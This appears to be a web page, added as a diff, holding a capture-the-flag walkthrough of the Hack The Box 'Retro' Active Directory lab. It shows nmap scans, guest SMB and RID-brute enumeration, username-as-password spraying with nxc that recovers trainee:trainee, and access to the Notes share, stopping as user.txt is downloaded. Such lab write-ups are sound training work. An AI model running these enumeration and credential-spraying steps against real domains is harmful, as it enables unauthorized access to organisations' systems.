@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Retro | Paracausal Telemetry</title><meta name="description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Trainees share, Compromising trainee." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retro/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Retro" /><meta property="og:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Trainees share, Compromising trainee." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retro/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retro/og.png?v=af6a14cf" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Retro" /><meta name="twitter:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Trainees share, Compromising trainee." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retro/og.png?v=af6a14cf" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Retro","description":"Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Trainees share, Compromising trainee.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retro/","datePublished":"2026-03-17","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Retro","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retro/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Retro</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-03-17 · 15 min read</p><h1>Retro</h1><p>Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Trainees share, Compromising trainee.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · easy</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Retro" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-retro.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-retro.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Retro</h2><p>Retro is an Easy Windows machine that showcases an Active Directory Domain Controller. Through SMB enumeration and pre-created machine account exploitation, we gain access to the system. Through the exploitation of the Active Directory Certificate Service and specifically by…</p></div><span class="room-badge room-badge-easy">Easy</span></div><dl class="room-facts"><div><dt>Released</dt><dd>24 Jun 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>r0BIT</dd></div><div><dt>Rating</dt><dd>4.6 / 5</dd></div><div><dt>User owns</dt><dd>2,810</dd></div><div><dt>Root owns</dt><dd>2,327</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 32S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 32S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 1971 votes from easiest to hardest"><rect x="0" y="34" width="20" height="30" rx="2" fill="hsl(96 70% 55%)"><title>327 votes</title></rect><rect x="26" y="34" width="20" height="30" rx="2" fill="hsl(96 70% 55%)"><title>332 votes</title></rect><rect x="52" y="0" width="20" height="64" rx="2" fill="hsl(80 70% 55%)"><title>700 votes</title></rect><rect x="78" y="31" width="20" height="33" rx="2" fill="hsl(70 70% 55%)"><title>361 votes</title></rect><rect x="104" y="52" width="20" height="12" rx="2" fill="hsl(50 70% 55%)"><title>126 votes</title></rect><rect x="130" y="59" width="20" height="5" rx="2" fill="hsl(38 70% 55%)"><title>57 votes</title></rect><rect x="156" y="61" width="20" height="3" rx="2" fill="hsl(28 70% 55%)"><title>37 votes</title></rect><rect x="182" y="62" width="20" height="2" rx="2" fill="hsl(16 70% 55%)"><title>13 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>6 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>12 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.2, Real-Life 6.0, CVE 5.4, Custom Exploitation 4.6, CTF-Like 4.0"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,66.6 149.9,97.0 132.2,140.6 91.1,136.1 83.4,101.3" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Retro" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=3000 retro.vl                 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 23:10 +0000
+Nmap scan report for retro.vl (10.129.234.44)
+Host is up (0.060s latency).
+rDNS record for 10.129.234.44: DC.retro.vl
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+9389/tcp  open  adws
+49664/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+51472/tcp open  unknown
+51491/tcp open  unknown
+51506/tcp open  unknown
+59271/tcp open  unknown
+65350/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 88.65 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 -A --min-rate=3000 retro.vl
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 23:13 +0000
+Nmap scan report for retro.vl (10.129.234.44)
+Host is up (0.025s latency).
+rDNS record for 10.129.234.44: DC.retro.vl
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-07 23:13:10Z)
+
+135/tcp  open  msrpc         Microsoft Windows RPC
+
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl
+| Not valid before: 2026-03-07T22:57:37
+|_Not valid after:  2027-03-07T22:57:37
+
+445/tcp  open  microsoft-ds?
+
+464/tcp  open  kpasswd5?
+
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl
+| Not valid before: 2026-03-07T22:57:37
+|_Not valid after:  2027-03-07T22:57:37
+|_ssl-date: TLS randomness does not represent time
+
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl
+| Not valid before: 2026-03-07T22:57:37
+|_Not valid after:  2027-03-07T22:57:37
+
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl
+| Not valid before: 2026-03-07T22:57:37
+|_Not valid after:  2027-03-07T22:57:37
+|_ssl-date: TLS randomness does not represent time
+
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETRO
+|   NetBIOS_Domain_Name: RETRO
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: retro.vl
+|   DNS_Computer_Name: DC.retro.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-07T23:13:54+00:00
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Not valid before: 2026-03-06T23:06:46
+|_Not valid after:  2026-09-05T23:06:46
+|_ssl-date: 2026-03-07T23:14:34+00:00; 0s from scanner time.
+
+9389/tcp open  mc-nmf        .NET Message Framing
+
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null authentication doesnt give me anything</p><h3>Guest access</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.retro.vl -u &#39;Guest&#39; -p &#39;&#39; --shares   
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
+SMB         10.129.234.44   445    DC               [*] Enumerated shares
+SMB         10.129.234.44   445    DC               Share           Permissions     Remark
+SMB         10.129.234.44   445    DC               -----           -----------     ------
+SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.44   445    DC               C$                              Default share
+SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
+SMB         10.129.234.44   445    DC               Notes                           
+SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
+SMB         10.129.234.44   445    DC               Trainees        READ</code></pre><p>I have read access on the <code>trainees</code> share</p><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.retro.vl -u &#39;Guest&#39; -p &#39;&#39; --rid-brute
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
+SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
+SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
+SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
+SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
+SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
+SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
+SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
+SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
+SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
+SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
+SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
+SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
+SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
+SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)</code></pre><p>From this list ill make a userlist AS-REP roasting failed</p><h2><code>Trainees</code> share</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient \\\\DC.retro.vl\\Trainees -U &#39;Guest&#39;
+Password for [WORKGROUP\Guest]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; l
+  .                                   D        0  Sun Jul 23 22:58:43 2023
+  ..                                DHS        0  Wed Jun 11 15:17:10 2025
+  Important.txt                       A      288  Sun Jul 23 23:00:13 2023
+
+		4659711 blocks of size 4096. 1325482 blocks available
+smb: \&gt; get Important.txt 
+getting file \Important.txt of size 288 as Important.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
+smb: \&gt; </code></pre><p>Ill have a read of this file</p><h3><code>Important.txt</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Dear Trainees,
+
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+
+Regards
+
+The Admins</code></pre><p>We already know there is an account called <code>trainee</code> from out user dump</p><h2>Compromising <code>trainee</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap DC.retro.vl -u users.txt -p users.txt --continue-on-success
+LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:Administrator 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:Guest 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:krbtgt 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:DC$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:trainee 
+LDAP        10.129.234.44   389    DC               [+] retro.vl\trainee:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:trainee 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:BANKING$ 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:jburley 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:tblack 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:tblack 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:tblack 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:tblack 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:tblack 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:tblack 
+LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:tblack</code></pre><p>From this output its clear to see that the <code>trainee</code> user has been compromised</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">trainee:trainee</code></pre><p>Now ill verify access</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.retro.vl -u trainee -p &#39;trainee&#39; --shares   
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
+SMB         10.129.234.44   445    DC               [*] Enumerated shares
+SMB         10.129.234.44   445    DC               Share           Permissions     Remark
+SMB         10.129.234.44   445    DC               -----           -----------     ------
+SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.44   445    DC               C$                              Default share
+SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.44   445    DC               Notes           READ            
+SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.234.44   445    DC               Trainees        READ</code></pre><p>I now have read access on the Notes share</p><h2><code>Notes</code> share</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient \\\\DC.retro.vl\\Notes -U &#39;trainee&#39;%&#39;trainee&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Apr  9 04:12:49 2025
+  ..                                DHS        0  Wed Jun 11 15:17:10 2025
+  ToDo.txt                            A      248  Sun Jul 23 23:05:56 2023
+  user.txt                            A       32  Wed Apr  9 04:13:01 2025
+
+		4659711 blocks of size 4096. 1325230 blocks available
+smb: \&gt; mget *
+Get file ToDo.txt? y
+getting file \ToDo.txt of size 248 as ToDo.txt (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
+Get file user.txt? y
+getting file \user.txt of size 32 as user.txt (0.5 KiloBytes/sec) (average 2.0 KiloBytes/sec)
